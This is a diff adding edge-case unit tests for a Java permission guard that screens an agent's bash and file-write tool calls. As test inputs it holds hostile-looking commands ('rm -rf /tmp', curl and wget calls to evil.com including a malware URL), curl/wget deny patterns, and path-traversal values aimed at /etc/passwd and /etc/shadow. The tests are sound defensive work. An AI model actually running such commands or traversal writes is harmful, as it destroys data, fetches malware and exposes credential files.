@@ -24,6 +24,7 @@ import io.kairo.api.tool.ToolCategory;
 import io.kairo.api.tool.ToolDefinition;
 import io.kairo.api.tool.ToolResult;
 import io.kairo.api.tool.ToolSideEffect;
+import java.util.Collections;
 import java.util.Map;
 import org.junit.jupiter.api.BeforeEach;
 import org.junit.jupiter.api.Test;
@@ -171,6 +172,95 @@ class PermissionDecisionTest {
                             assertTrue(decision.allowed());
                             assertNull(decision.reason());
                         })
+                .verifyComplete();
+    }
+
+    // ==================== EDGE CASE TESTS ====================
+
+    @Test
+    void testMultipleDangerousPatterns() {
+        // Register additional custom patterns
+        guard.addDangerousPattern("\\bcurl\\b");
+        guard.addDangerousPattern("\\bwget\\b");
+
+        // Verify original patterns still work
+        StepVerifier.create(guard.checkPermissionDetail("bash", Map.of("command", "rm -rf /tmp")))
+                .assertNext(d -> {
+                    assertFalse(d.allowed());
+                    assertEquals("dangerous-command", d.policyId());
+                })
+                .verifyComplete();
+
+        // Verify first custom pattern works
+        StepVerifier.create(guard.checkPermissionDetail("bash", Map.of("command", "curl http://evil.com")))
+                .assertNext(d -> {
+                    assertFalse(d.allowed());
+                    assertEquals("dangerous-command", d.policyId());
+                })
+                .verifyComplete();
+
+        // Verify second custom pattern works
+        StepVerifier.create(guard.checkPermissionDetail("bash", Map.of("command", "wget http://evil.com/malware")))
+                .assertNext(d -> {
+                    assertFalse(d.allowed());
+                    assertEquals("dangerous-command", d.policyId());
+                })
+                .verifyComplete();
+
+        // Verify safe command still allowed
+        StepVerifier.create(guard.checkPermissionDetail("bash", Map.of("command", "echo hello")))
+                .assertNext(d -> assertTrue(d.allowed()))
+                .verifyComplete();
+    }
+
+    @Test
+    void testPathTraversalAttackBlocked() {
+        // Path traversal attack with ../../../etc/passwd should be blocked
+        StepVerifier.create(
+                        guard.checkPermissionDetail(
+                                "write", Map.of("file_path", "../../../etc/passwd")))
+                .assertNext(d -> {
+                    assertFalse(d.allowed());
+                    assertEquals("sensitive-path", d.policyId());
+                })
+                .verifyComplete();
+
+        // Another traversal variant
+        StepVerifier.create(
+                        guard.checkPermissionDetail(
+                                "edit", Map.of("path", "/tmp/safe/../../etc/shadow")))
+                .assertNext(d -> {
+                    assertFalse(d.allowed());
+                    assertEquals("sensitive-path", d.policyId());
+                })
+                .verifyComplete();
+    }
+
+    @Test
+    void testNullInputMapHandled() {
+        // Null input map should not cause NPE — the guard checks for "command" key
+        // which returns null from a null-safe perspective. We pass an empty map
+        // (since Map parameter is non-null contract) and also test with no relevant keys.
+        StepVerifier.create(guard.checkPermissionDetail("bash", Collections.emptyMap()))
+                .assertNext(d -> assertTrue(d.allowed()))
+                .verifyComplete();
+
+        // Write tool with empty map (no path keys) — should allow
+        StepVerifier.create(guard.checkPermissionDetail("write", Collections.emptyMap()))
+                .assertNext(d -> assertTrue(d.allowed()))
+                .verifyComplete();
+    }
+
+    @Test
+    void testEmptyCommandStringHandled() {
+        // Empty string command should be allowed (no pattern matches empty)
+        StepVerifier.create(guard.checkPermissionDetail("bash", Map.of("command", "")))
+                .assertNext(d -> assertTrue(d.allowed()))
+                .verifyComplete();
+
+        // Whitespace-only command should also be allowed
+        StepVerifier.create(guard.checkPermissionDetail("bash", Map.of("command", "   ")))
+                .assertNext(d -> assertTrue(d.allowed()))
                 .verifyComplete();
     }
 
